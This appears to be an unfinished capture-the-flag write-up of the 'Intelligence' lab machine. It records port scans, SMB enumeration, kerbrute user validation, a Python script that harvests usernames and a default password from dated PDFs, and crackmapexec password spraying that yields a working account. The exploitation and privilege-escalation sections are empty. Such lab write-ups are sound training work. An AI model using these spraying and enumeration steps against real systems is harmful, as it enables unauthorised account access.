---
description: 09-24-22
---

# Intelligence (Medium)

### Improved skills

* Skill 1
* Skill 2

### Used tools

* Nmap -- NmapAutomator.sh

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-25 03:44:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
53972/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Enumerated UDP ports:

```
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap
```

Notes:

* 53/DNS - Added <mark style="color:yellow;">intelligence.htb</mark> to <mark style="color:yellow;">/etc/hosts</mark>. Attempted zone transfer with no luck.
* 80/HTTP - Visual Inspection
* 88/Kerberos - Userenum?
* 135/RPC -&#x20;
* 389/LDAP - Nothing
* 445/SMB - Nothing null, nothing guest
* 5985/WinRM - <mark style="color:yellow;">Initial entry point? -- Creds needed</mark>

### Visual Inspection

* Input field for email subscription
* Email of contact@intelligence.htb -- only works with an email
  * Intercept w/ burp
  * There is no request when sending an email for the subscription
* There are images on the site as well
  * Two PDFs -- run exiftool

## Enumeration

### Port 80 (IIS 10.0)

Dirsearch:

Wordlists used:&#x20;

* Default dirsearch wordlist
* common.txt

```
[16:48:57] 301 -  157B  - /documents  ->  http://intelligence.htb/documents/
[16:49:00] 200 -    7KB - /index.html
```

* <mark style="color:yellow;">/Documents</mark> gives us a 403 forbidden
  * Attempt 403 bypass
  * None of my bypass attempts worked

Source Code:

* Nothing seemed to be in the source code

### Enum4Linux

* I was unable to obtain anything interesting from this

```
Domain Sid: S-1-5-21-4210132550-3389855604-3437519686
```

### SMB&#x20;

smbmap:

```
smbmap -H 10.129.95.154
```

* Nothing

smbclient:

```
smbclient -L "//10.129.95.154/" -U "guest"%
```

* Status: Account\_Disabled

### LDAP

* Attempted to do recon on LDAP, however, I could not communicate with the LDAP server

### VHOST/Subdomain Bruteforce

gobuster:

```
gobuster vhost -u http://10.129.95.154/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30 | grep 200
```

* Unable to find anything

### Downloaded Documents

* 2020-01-01-upload.pdf
  * <mark style="color:yellow;">William.Lee</mark>
* 2020-12-15-upload.pdf
  * <mark style="color:yellow;">Jose.Williams</mark>
* We find potentially useful metadata in here
* Let's place these usernames in a text file and use it against kerbrute to validate users

### Kerbrute

* We will now use kerbrute to validate users that we found in the PDFs

```
./kerbrute_linux_amd64 userenum --dc 10.129.95.154  -d intelligence.htb users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/25/22 - Ronnie Flathers @ropnop

2022/09/25 11:26:18 >  Using KDC(s):
2022/09/25 11:26:18 >   10.129.95.154:88

2022/09/25 11:26:18 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2022/09/25 11:26:18 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2022/09/25 11:26:18 >  Done! Tested 2 usernames (2 valid) in 0.118 seconds
```

* <mark style="color:yellow;">We see that these are valid usernames!!!</mark>
  * Let's try AS-REP Roasting
  * This did not work unfortunately
* We see that the documents possess a naming convention of <mark style="color:yellow;">YYYY-MM-DD</mark>, so are there any more?

### Python Script

findpdfs.py

```
#!/usr/bin/env python3

import datetime
import io
import PyPDF2
import requests


t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        with io.BytesIO(resp.content) as data:
            pdf = PyPDF2.PdfFileReader(data)
            users.add(pdf.getDocumentInfo()['/Creator'])
            for page in range(pdf.getNumPages()):
                text = pdf.getPage(page).extractText()
                if any([k in text.lower() for k in keywords]):
                    print(f'==={url}===\n{text}')
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break

with open('users', 'w') as f:
    f.write('\n'.join(users)) 

```

* This script will take some time to run
* It will generate a file called users

When we run the python script we get the output of:

```
===http://intelligence.htb/documents/2020-06-04-upload.pdf===
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
===http://intelligence.htb/documents/2020-12-30-upload.pdf===
Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.
```

* Please login using your username and the default password of: <mark style="color:yellow;">NewIntelligenceCorpUser9876</mark>
* When we run wc on the users file, we see that we get 29 users!
* Let's spray this password around

### Password Spraying

Crackmapexec

```
crackmapexec smb 10.129.95.154 -u users -p 'NewIntelligenceCorpUser9876'
SMB         10.129.95.154   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

* We get a hit, I immediately attempt to WinRM into the box but with no luck
* However, we now have SMB creds
* <mark style="color:yellow;">Tiffany.Molina:NewIntelligenceCorpUser9876</mark>

### SMB Enumeration w/ new account

smbmap:

```
smbmap -H 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 Sun 25 Sep 2022 12:20:31 PM EDT
[+] IP: 10.129.95.154:445       Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

smbclient:

```
```

## Exploitation

### Name of the technique

This is the exploit

## Privilege Escalation

### Local enumeration

### PrivEsc vector

## Proofs
